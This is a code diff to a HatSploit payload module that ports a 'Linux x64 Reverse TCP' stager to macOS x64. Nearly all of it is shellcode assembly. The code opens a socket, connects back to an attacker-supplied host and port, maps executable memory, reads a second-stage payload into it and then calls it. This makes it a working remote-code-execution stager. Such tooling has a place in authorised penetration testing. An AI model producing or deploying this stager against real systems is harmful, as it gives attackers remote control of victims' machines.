@@ -9,17 +9,17 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "Linux x64 Reverse TCP",
-            'Payload': "linux/x64/reverse_tcp",
+            'Name': "macOS x64 Reverse TCP",
+            'Payload': "macos/x64/reverse_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
-                "This payload creates an interactive reverse TCP connection for Linux "
+                "This payload creates an interactive reverse TCP connection for macOS "
                 "with x64 architecture and reads next phase."
             ),
             'Arch': ARCH_X64,
-            'Platform': OS_LINUX,
+            'Platform': OS_MACOS,
             'Type': REVERSE_TCP,
         })
 
@@ -31,104 +31,93 @@ class HatSploitPayload(Payload, Handler):
     def run(self):
         assembly = """
         start:
-            push    0x29
-            pop     rax
-            push    0x2
-            pop     rdi
-            push    0x1
-            pop     rsi
+            xor rdi, rdi
+            mul rdi
+            mov dil, 0x2
+            xor rsi, rsi
+            mov sil, 0x1
+            mov al, 0x2
+            ror rax, 0x28
+            mov r8, rax
+            mov al, 0x61
             syscall
         """
 
         if self.reliable.value:
             assembly += """
-                test    rax, rax
-                js      fail
+                jb fail
             """
 
         assembly += f"""
-            xchg 	rdi, rax
-            movabs	rcx, 0x{self.rhost.little.hex()}{self.rport.little.hex()}0002
-            push	rcx
-            mov		rsi, rsp
-            push	0x10
-            pop		rdx
-            push	0x2a
-            pop		rax
+            mov rsi, 0x{self.rhost.little.hex()}{self.rport.little.hex()}020f
+            push rsi
+            push rsp
+            pop rsi
+            mov rdi, rax
+            xor dl, 0x10
+            mov rax, r8
+            mov al, 0x62
             syscall
         """
 
         if self.reliable.value:
             assembly += """
-                test    rax, rax
-                js      fail
+                jb fail
             """
 
         if not self.length.value:
             assembly += """
-                push 	rdi
-                push	0x4
-                pop 	rdx
-                push 	0x0
-                lea 	rsi, [rsp]
-                xor 	rax, rax
+                mov rdx, 4
+                push 0x0
+                lea rsi, [rsp]
+                mov rax, 0x2000062
                 syscall
             """
 
         else:
             assembly += f"""
-                push    rdi
-                push    {hex(self.length.value)}
+                push {hex(self.length.value)}
             """
 
         assembly += """
-            pop 	rsi
-            push 	0x9
-            pop 	rax
-            xor 	rdi, rdi
-            push 	0x7
-            pop 	rdx
-            xor		r9, r9
-            push	0x22
-            pop		r10
+            pop rsi
+            push rdi
+            xor rdi, rdi
+            mov rdx, 7
+            mov r10, 0x1002
+            xor r8, r8
+            xor r9, r9
+            mov rax, 0x20000c5
             syscall
         """
 
         if self.reliable.value:
             assembly += """
-                test    rax, rax
-                js      fail
+                jb fail
             """
 
         assembly += """
-            pop		rdi
-            push 	rsi
-            pop 	rdx
-            push 	rax
-            pop		rsi
-            push 	0x2d
-            pop		rax
-            push	0x100
-            pop		r10
+            mov r12, rax
+            pop rdi
+            mov rsi, r12
+            mov rax, 0x200001d
             syscall
         """
 
         if self.reliable.value:
             assembly += """
-                test    rax, rax
-                js      fail
+                jb fail
             """
 
         assembly += """
-            jmp rsi
+            call r12
         """
 
         if self.reliable.value:
             assembly += """
             fail:
-                push    0x3c
-                pop     rax
-                xor     rdi, rdi
+                mov rax, 0x2000001
+                mov rdi, 0x1
                 syscall
             """
 
